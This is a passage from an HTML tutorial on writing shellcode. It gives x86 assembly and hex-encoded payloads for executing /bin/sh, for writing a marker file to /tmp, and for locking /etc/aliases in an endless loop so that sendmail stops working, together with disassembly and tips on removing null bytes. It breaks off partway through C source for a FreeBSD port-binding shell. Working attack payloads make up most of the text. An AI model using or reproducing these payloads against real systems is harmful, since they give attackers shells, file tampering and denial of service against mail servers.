&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x46\x20\xb0\x0b\x89\xf3\x8d\x4e\x14\x8d\x56\x20\xcd\x80\xe8"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x23\x2d\x63\x23"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x2f\x62\x69\x6e\x2f\x6c\x73\x23\x41\x41\x41\x41\x42\x42\x42"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x42\x43\x43\x43\x43\x44\x44\x44\x44";

[root@droopy execve-3]# s-proc -e execve
Calling code ...
execve&nbsp; execve.S
[root@droopy execve-3]#</pre>

<h2>
<u>The open() write() close() and exit() example (linux):</u></h2>

<pre>BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:&nbsp;&nbsp;&nbsp;

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 14], al&nbsp;&nbsp; ; <i>terminate /tmp/hacked.txt
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 29],0xa&nbsp;&nbsp; ; <i>0xa == newline
</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 30], al&nbsp;&nbsp; ; <i>terminate niels was here&nbsp;
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi + 15]&nbsp; ; <i>get address
</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 31], ebx&nbsp; ; <i>put the address of niels--here in xxxx
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>the syscall open() = 5&nbsp;
</i>lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>argument #1</i>&nbsp;&nbsp;&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cx, 1090&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>1024 (append) + 64 (create if no exist) + 2 rw
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx, 744q&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>if we need to create, these are the permissions
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>kernel int

</i>mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>get the descriptor
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 4&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,[esi + 31]&nbsp;&nbsp; ; <i>the location of our data
</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx, 15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>the size of our data
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>kernel interrupt

</i>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 6&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>the close syscall = 6
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>clozzzz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</i>&nbsp;

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x01&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>exit system call
</i>xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>clean up
</i>int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>and bail out&nbsp;


</i>callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/tmp/owned.txt#'
db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'niels was here #xxxx'


Now this code will generate the following shellcode:

sh-2.04$ ../../../process open shellcode
Calling code ...
bash-2.05$ cat shellcode&nbsp;
char shellcode[] =&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x38\x5e\x31\xc0\x88\x46\x0e\xc6\x46\x1d\x0a\x88\x46\x1e"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x8d\x5e\x0f\x89\x5e\x1f\xb0\x05\x8d\x1e\x66\xb9\x42\x04\x66"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xba\xe4\x01\xcd\x80\x89\xc3\xb0\x04\x8b\x4e\x1f\x66\xba\x0f"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\<b>x00</b>\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8\xc3"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\xff\xff\x2f\x74\x6d\x70\x2f\x6f\x77\x6e\x65\x64\x2e\x74"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x78\x74\x23\x6e\x69\x65\x6c\x73\x20\x77\x61\x73\x20\x68\x65"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x72\x65\x20\x23\x78\x78\x78\x78";

bash-2.05$&nbsp;

As you can see there is a NULL byte in it and thus this shellcode cannot be used So lets find out
what the problem is by using ndisasm.

bash-2.04$ ndisasm open&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
00000000&nbsp; EB38&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp short 0x3a
00000002&nbsp; 5E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; pop si
00000003&nbsp; 31C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor ax,ax
00000005&nbsp; 88460E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [bp+0xe],al
00000008&nbsp; C6461D0A&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov byte [bp+0x1d],0xa
0000000C&nbsp; 88461E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [bp+0x1e],al
0000000F&nbsp; 8D5E0F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea bx,[bp+0xf]
00000012&nbsp; 895E1F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov [bp+0x1f],bx
00000015&nbsp; B005&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,0x5
00000017&nbsp; 8D1E66B9&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lea bx,[0xb966]
0000001B&nbsp; 42&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; inc dx
0000001C&nbsp; 0466&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; add al,0x66
0000001E&nbsp; BAE401&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov dx,0x1e4
00000021&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80
00000023&nbsp; 89C3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov bx,ax
00000025&nbsp; B004&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,0x4
00000027&nbsp; 8B4E1F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov cx,[bp+0x1f]
0000002A&nbsp; 66BA0F00CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov edx,0x80cd000f&nbsp;&nbsp;&nbsp;&nbsp; <b>&lt;-- beh !
</b>00000030&nbsp; B006&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,0x6
00000032&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80
00000034&nbsp; B001&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; mov al,0x1
00000036&nbsp; 31DB&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; xor bx,bx
00000038&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; int 0x80
0000003A&nbsp; E8C3FF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; call 0x0
0000003D&nbsp; FF&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; db 0xFF
0000003E&nbsp; FF2F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jmp far [bx]
00000040&nbsp; 746D&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jz 0xaf
00000042&nbsp; 702F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jo 0x73
00000044&nbsp; 6F&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outsw
00000045&nbsp; 776E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ja 0xb5
00000047&nbsp; 65642E7478&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cs jz 0xc4
0000004C&nbsp; 7423&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jz 0x71
0000004E&nbsp; 6E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; outsb
0000004F&nbsp; 69656C7320&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; imul sp,[di+0x6c],0x2073
00000054&nbsp; 7761&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ja 0xb7
00000056&nbsp; 7320&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; jnc 0x78
00000058&nbsp; 686572&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; push word 0x7265
0000005B&nbsp; 652023&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; and [gs:bp+di],ah
0000005E&nbsp; 7878&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; js 0xd8
00000060&nbsp; 7878&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; js 0xda


As you might have already seen that the number of bytes we want&nbsp;
to write is causing a problem. That means the following line needs a fix:&nbsp;

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx, 15&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;

We can fix that by using the following trick:

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx,9995&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; A trick to get 15 in dx without getting null bytes
sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dx,9980</pre>

<pre>So what we do is we store 9995 in dx and substract 9980 from it. As a result
dx will contain 15, which is exactly the amount of bytes we want to write in
the opened file. After correcting this error we get the following shellcode:
&nbsp;
char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x39\x5e\x31\xc0\x88\x46\x0e\x88\x46\x1e\x8d\x5e\x0f\x89"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x5e\x1f\xb0\x05\x8d\x1e\x66\xb9\x42\x04\x66\xba\xe4\x01\xcd"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x80\x89\xc3\xb0\x04\x8b\x4e\x1f\x66\xba\x0b\x27\x66\x81\xea"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xfc\x26\xcd\x80\xb0\x06\xcd\x80\xb0\x01\x31\xdb\xcd\x80\xe8"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xc2\xff\xff\xff\x2f\x74\x6d\x70\x2f\x6f\x77\x6e\x65\x64\x2e"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x74\x78\x74\x23\x6e\x69\x65\x6c\x73\x20\x77\x61\x73\x20\x68"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x65\x72\x65\x20\x23\x78\x78\x78\x78";</pre>

<pre>And gone is the null byte ! ;-)
</pre>

<h2>
<b><u>Linux sendmail harrasing shellcode:</u></b><br>
<br></h2>

<pre>This shellcode abused a weakness in sendmail that can prevent that application
from being able to work properly. More information about that issue can be found
here: http://www.sendmail.org/LockingAdvisory.txt


BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Make sure the registers we use
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; are clean
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,0x2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; 0x2 is fork(). This function returns
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; A process ID to the parent and a 0 to the
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; child process. We can test on this and let
test&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; the parent process exit. This is an important
jnz&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; exit&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; test which can be crucial with forking bind
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; shellcode. (man fork)
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12],al&nbsp; ; Terminate /etc/aliases
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; ecx = 0
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The ebx register will contain the
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; location of our data which is 'esi'
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; we open() the file and safe the returned
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; file descriptor in ebx after cleaning this
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; register with xor.
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl,0x2&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We want an exclusively lock
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,143&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; flock()
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; call kernel and make the lock a fact

sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl,0x3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Start a infinite loop to make sure
l00p:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; that sendmail cannot access the file
js&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; l00p

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/etc/aliases'

exit:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Exit will get called in the parent process
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This is not really needed I guess you can just&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; let it crash to safe space ;-)
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Execute !! ;-))
</pre>

<pre></pre>

<pre></pre>

<h2>
<u>The FreeBSD port binding shellcode example:</u></h2>

<pre>While port binding shellcode looks very complex, it isn't really that hard to write it.
It very much like the above example, several system calls on a row from which some are&nbsp;
using information that was returned from another (I introduced this in the above example).&nbsp;
When writing a bit more complex code it can help if you first write it in c. In our case&nbsp;
just ripped the c source of the port binding shellcode that Taeho Oh wrote for his shellcode&nbsp;
document and made some minor changes to it. The assembly code generated from this c source is&nbsp;
ofcourse hombrewn and works like a charm on FreeBSD.</pre>

<pre>#include&lt;unistd.h&gt;
#include&lt;sys/socket.h&gt;
#include&lt;netinet/in.h&gt;

int soc,cli;
struct sockaddr_in serv_addr;

int main()
{
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(fork()==0)
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; {


&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serv_addr.sin_family=2;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serv_addr.sin_addr.s_addr=0;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; serv_addr.sin_port=0xAAAA;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; soc=socket(2,1,6);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bind(soc,(struct sockaddr *)&amp;serv_addr,0x10);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; listen(soc,1);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cli=accept(soc,0,0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2(cli,0);
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; dup2(cli,1);
